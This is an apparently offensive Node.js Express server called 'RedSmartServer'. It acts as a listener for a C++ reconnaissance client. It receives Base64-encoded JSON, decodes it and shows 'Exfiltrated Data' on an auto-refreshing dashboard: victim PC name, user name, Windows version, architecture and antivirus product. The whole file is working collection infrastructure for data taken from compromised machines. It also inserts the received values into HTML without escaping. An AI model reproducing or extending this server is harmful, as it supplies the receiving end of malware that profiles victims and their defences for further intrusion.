const express = require('express');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;

// Use body-parser to handle raw text (Base64)
app.use(bodyParser.text({ type: 'text/plain' }));

// Simple HTML template to display the data
let latestExfiltration = "No data received yet.";

app.post('/receive', (req, res) => {
    console.log("Received data length:", req.body.length);
    
    try {
        // Decode Base64
        const decoded = Buffer.from(req.body, 'base64').toString('utf-8');
        console.log("Decoded data:", decoded);
        
        // Parse JSON
        const data = JSON.parse(decoded);
        
        latestExfiltration = `
            <h2>Exfiltrated Data</h2>
            <table border="1" cellpadding="10" style="border-collapse: collapse; font-family: sans-serif;">
                <tr><th>PC Name</th><td>${data.pcName}</td></tr>
                <tr><th>User Name</th><td>${data.userName}</td></tr>
                <tr><th>Windows Version</th><td>${data.windowsVersion}</td></tr>
                <tr><th>Architecture</th><td>${data.architecture}</td></tr>
                <tr><th>Antivirus</th><td>${data.antivirus}</td></tr>
            </table>
        `;
        
        res.status(200).send("OK");
    } catch (e) {
        console.error("Error decoding/parsing data:", e);
        res.status(400).send("Bad Request");
    }
});

app.get('/', (req, res) => {
    res.send(`
        <html>
        <head><title>RedSmartServer Dashboard</title></head>
        <body style="font-family: sans-serif; padding: 20px;">
            <h1>RedSmartServer Listening</h1>
            <p>Waiting for recon data from the C++ client...</p>
            <hr>
            ${latestExfiltration}
            <script>
                // Auto-refresh every 5 seconds to check for new data
                setTimeout(() => location.reload(), 5000);
            </script>
        </body>
        </html>
    `);
});

app.listen(PORT, () => {
    console.log(`Server is running at http://localhost:${PORT}`);
    console.log("Waiting for data...");
});
